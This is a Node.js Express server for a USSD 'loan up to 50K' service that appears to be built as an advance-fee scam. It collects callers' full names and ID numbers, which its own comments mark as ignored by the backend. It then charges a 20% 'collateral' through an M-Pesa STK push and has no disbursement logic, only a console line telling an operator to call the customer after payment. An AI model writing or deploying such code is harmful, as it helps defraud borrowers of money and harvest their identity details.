require('dotenv').config();
const express = require('express');
const axios = require('axios');
const fs = require('fs');

const app = express();
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// ============================================
// IN-MEMORY STORAGE (No Database Required)
// ============================================
// Active USSD sessions
const sessions = new Map();

// Pending STK jobs - each job is processed immediately but ASYNC
// This ensures STK triggers don't block the USSD response
const pendingSTKJobs = new Map();

// ============================================
// HELPER: Format phone number for PesaFlux
// ============================================
function formatPhoneForPesaFlux(rawPhone) {
    let cleaned = rawPhone.toString().replace(/[\s\-\(\)]/g, '');
    cleaned = cleaned.replace(/^\+/, '');
    
    if (cleaned.startsWith('254')) {
        cleaned = cleaned.replace(/^2540+/, '254');
    } else if (cleaned.startsWith('0')) {
        cleaned = '254' + cleaned.substring(1);
    } else if (cleaned.startsWith('7') || cleaned.startsWith('1')) {
        cleaned = '254' + cleaned;
    }
    
    if (!/^2547\d{8}$/.test(cleaned)) {
        return { valid: false, formatted: cleaned, error: "Enter a valid Safaricom number (e.g., 0722123456 or 254722123456)" };
    }
    return { valid: true, formatted: cleaned, error: null };
}

// ============================================
// BACKGROUND STK PROCESSOR
// Processes each STK job immediately upon creation
// Runs asynchronously so it doesn't block the USSD response
// ============================================
async function processSTKJob(sessionId, jobData) {
    const { phone, amount, orderRef, callbackUrl, rawPhoneEntered } = jobData;
    
    try {
        console.log(`[STK] Processing job for session ${sessionId} | Phone: ${phone} | Amount: ${amount}`);
        
        const pesafluxResponse = await axios.post(
            'https://pesaflux.com/api/stkpush',
            {
                amount: amount,
                phone: phone,
                order_ref: orderRef,
                callback_url: callbackUrl
            },
            {
                headers: {
                    'Authorization': `Bearer ${process.env.PESAFLUX_API_KEY}`,
                    'Content-Type': 'application/json'
                },
                timeout: 15000
            }
        );
        
        if (pesafluxResponse.data && pesafluxResponse.data.checkout_request_id) {
            console.log(`[STK] SUCCESS for ${sessionId} | CheckoutID: ${pesafluxResponse.data.checkout_request_id}`);
            
            // Log successful initiation
            fs.appendFileSync('payments.log', 
                `${new Date().toISOString()} | STK_SENT | Session:${sessionId} | Phone:${phone} | Amount:${amount} | CheckoutID:${pesafluxResponse.data.checkout_request_id}\n`
            );
            
            // Mark job as completed
            pendingSTKJobs.delete(sessionId);
        } else {
            throw new Error('No checkout_request_id in response');
        }
        
    } catch (error) {
        console.error(`[STK] FAILED for ${sessionId}:`, error.response?.data || error.message);
        
        fs.appendFileSync('payments.log', 
            `${new Date().toISOString()} | STK_FAILED | Session:${sessionId} | Phone:${phone} | Error:${error.response?.data?.message || error.message}\n`
        );
        
        // Keep the job in pending map for potential retry? 
        // For now, delete it to prevent infinite loops
        pendingSTKJobs.delete(sessionId);
    }
}

// ============================================
// MAIN USSD HANDLER
// ============================================
app.post('/ussd', async (req, res) => {
    const { sessionId, phoneNumber, text } = req.body;
    console.log(`📱 ${sessionId.slice(-6)} | Input: "${text}"`);
    
    const respond = (message, endSession = false) => {
        res.set('Content-Type', 'text/plain');
        res.send(`${endSession ? 'END' : 'CON'} ${message}`);
    };
    
    // NEW SESSION
    if (text === '') {
        sessions.set(sessionId, {
            phone: phoneNumber,
            step: 'welcome',
            timestamp: Date.now(),
            collectedData: {}
        });
        return respond(`WELCOME\nLoan up to 50K\n1.Apply 2.Exit`);
    }
    
    const session = sessions.get(sessionId);
    if (!session) {
        return respond(`Session expired. Dial code again.`, true);
    }
    
    const inputs = text.split('*');
    const currentLevel = inputs.length - 1;
    
    // ========== MENU (Level 0) ==========
    if (currentLevel === 0) {
        if (inputs[0] === '1') {
            session.step = 'asking_fullname';
            sessions.set(sessionId, session);
            return respond(`Enter your FULL NAME (as on ID):`);
        } else if (inputs[0] === '2') {
            sessions.delete(sessionId);
            return respond(`Goodbye!`, true);
        } else {
            return respond(`1.Apply 2.Exit`);
        }
    }
    
    // ========== FULL NAME (IGNORED BY BACKEND) ==========
    if (session.step === 'asking_fullname') {
        session.collectedData.fullname = inputs[currentLevel];
        session.step = 'asking_idnumber';
        sessions.set(sessionId, session);
        return respond(`Enter your ID NUMBER:`);
    }
    
    // ========== ID NUMBER (IGNORED BY BACKEND) ==========
    if (session.step === 'asking_idnumber') {
        session.collectedData.idnumber = inputs[currentLevel];
        session.step = 'asking_amount';
        sessions.set(sessionId, session);
        return respond(`Enter loan amount (500-50,000):`);
    }
    
    // ========== LOAN AMOUNT ==========
    if (session.step === 'asking_amount') {
        const amount = parseInt(inputs[currentLevel]);
        if (isNaN(amount) || amount < 500 || amount > 50000) {
            return respond(`Amount must be 500-50,000. Try again:`);
        }
        session.loanAmount = amount;
        session.collateral = Math.floor(amount * 0.20);
        session.step = 'asking_purpose';
        sessions.set(sessionId, session);
        return respond(`Loan: KES ${amount}\nCollateral: KES ${session.collateral}\nPurpose?\n1.Business 2.School 3.Emergency 4.Other`);
    }
    
    // ========== PURPOSE (IGNORED BY BACKEND) ==========
    if (session.step === 'asking_purpose') {
        const purposeMap = { '1':'Business', '2':'School fees', '3':'Emergency', '4':'Other' };
        if (!purposeMap[inputs[currentLevel]]) {
            return respond(`1.Business 2.School 3.Emergency 4.Other`);
        }
        session.collectedData.purpose = purposeMap[inputs[currentLevel]];
        session.step = 'asking_phone';
        sessions.set(sessionId, session);
        return respond(`Enter M-Pesa number for loan:\n(Format: 0722123456)`);
    }
    
    // ========== PHONE NUMBER (CRITICAL - TRIGGERS STK) ==========
    if (session.step === 'asking_phone') {
        const rawPhone = inputs[currentLevel];
        const phoneValidation = formatPhoneForPesaFlux(rawPhone);
        
        if (!phoneValidation.valid) {
            return respond(`Invalid. ${phoneValidation.error}\nTry again:`);
        }
        
        // Store phone number and mark this session as ready for STK
        session.customerPhone = phoneValidation.formatted;
        session.rawPhoneEntered = rawPhone;
        session.step = 'confirm_phone';
        sessions.set(sessionId, session);
        
        return respond(`Confirm ${rawPhone} is correct?\n1.Yes 2.No`);
    }
    
    // ========== CONFIRM PHONE NUMBER ==========
    if (session.step === 'confirm_phone') {
        if (inputs[currentLevel] === '2') {
            session.step = 'asking_phone';
            sessions.set(sessionId, session);
            return respond(`Enter correct number (e.g., 0722123456):`);
        }
        
        if (inputs[currentLevel] !== '1') {
            return respond(`1.Yes 2.No`);
        }
        
        // Phone is confirmed. Now trigger STK as a BACKGROUND JOB
        // The USSD session will END immediately, and STK will be sent asynchronously
        const orderRef = `LOAN-${sessionId.slice(-8)}-${Date.now()}`;
        const callbackUrl = `${req.protocol}://${req.get('host')}/pesaflux-callback`;
        
        // Create a job object
        const stkJob = {
            phone: session.customerPhone,
            amount: session.collateral,
            orderRef: orderRef,
            callbackUrl: callbackUrl,
            rawPhoneEntered: session.rawPhoneEntered,
            collectedData: session.collectedData // Preserved for future use
        };
        
        // Store the job in pending map (for idempotency)
        if (!pendingSTKJobs.has(sessionId)) {
            pendingSTKJobs.set(sessionId, stkJob);
            
            // Process the job IMMEDIATELY in the background
            // This does NOT block the USSD response
            setImmediate(() => {
                processSTKJob(sessionId, stkJob);
            });
        }
        
        // Log that we received the request
        fs.appendFileSync('payments.log', 
            `${new Date().toISOString()} | REQUEST | Session:${sessionId} | Phone:${session.customerPhone} | Amount:${session.collateral}\n`
        );
        
        // End USSD session immediately - user doesn't wait for STK response
        sessions.delete(sessionId);
        
        return respond(`✅ We'll send M-Pesa prompt to ${session.rawPhoneEntered}\nCheck your phone and enter PIN.\nThank you!`, true);
    }
    
    // ========== FALLBACK ==========
    sessions.delete(sessionId);
    return respond(`Error. Dial code again.`, true);
});

// ============================================
// PESAFLUX CALLBACK - Payment confirmation
// ============================================
app.post('/pesaflux-callback', async (req, res) => {
    const callbackData = req.body;
    console.log(`\n🔔 CALLBACK: ${new Date().toISOString()}`);
    
    fs.appendFileSync('payments.log', 
        `${new Date().toISOString()} | CALLBACK | ${JSON.stringify(callbackData)}\n`
    );
    
    let isSuccessful = false;
    let amount = null;
    let phone = null;
    let receipt = null;
    let checkoutId = null;
    
    if (callbackData.status === 'success' || callbackData.ResultCode === '0' || callbackData.ResultCode === 0) {
        isSuccessful = true;
        amount = callbackData.amount || callbackData.Amount;
        phone = callbackData.phone || callbackData.PhoneNumber;
        receipt = callbackData.mpesa_receipt_number || callbackData.MpesaReceiptNumber || callbackData.TransactionID;
        checkoutId = callbackData.checkout_request_id || callbackData.CheckoutRequestID;
    }
    
    if (isSuccessful) {
        const separator = '='.repeat(60);
        console.log(`
${separator}
💰💰💰 PAYMENT RECEIVED - ACTION REQUIRED! 💰💰💰
${separator}
📱 Phone: ${phone}
💰 Amount: KES ${amount}
🧾 Receipt: ${receipt}
🆔 CheckoutID: ${checkoutId}
⏰ Time: ${new Date().toLocaleString()}
${separator}
⚠️ CALL THIS CUSTOMER TO DISBURSE LOAN ⚠️
📞 ${phone}
${separator}`);
        
        fs.appendFileSync('payments.log', `
SUCCESS - ${new Date().toISOString()}
Phone: ${phone} | Amount: KES ${amount} | Receipt: ${receipt}
`);
    } else {
        console.log(`❌ Payment failed:`, callbackData);
    }
    
    res.json({ ResultCode: 0, ResultDesc: "Success" });
});

// ============================================
// HEALTH CHECK
// ============================================
app.get('/health', (req, res) => {
    res.json({
        status: 'running',
        timestamp: new Date().toISOString(),
        activeSessions: sessions.size,
        pendingSTKJobs: pendingSTKJobs.size,
        version: '3.0.0'
    });
});

app.get('/', (req, res) => {
    res.send(`
        <h2>✅ USSD Loan App v3</h2>
        <p>Status: Running | Sessions: ${sessions.size} | Pending STK: ${pendingSTKJobs.size}</p>
        <p>POST /ussd - USSD endpoint</p>
        <p>POST /pesaflux-callback - Payment callback</p>
    `);
});

// ============================================
// START SERVER
// ============================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════════════╗
║     ✅ USSD LOAN APP v3 - DEPLOYED             ║
╠════════════════════════════════════════════════╣
║  Port: ${PORT}                                  ║
║  USSD: POST /ussd                             ║
║  Callback: POST /pesaflux-callback            ║
╠════════════════════════════════════════════════╣
║  ✨ NEW: Collects full name, ID, purpose      ║
║  ✨ NEW: STK triggered OUTSIDE USSD scope     ║
║  ✨ NEW: Each session isolated               ║
║  ✨ NEW: No database - in-memory idempotency  ║
╚════════════════════════════════════════════════╝
    `);
});
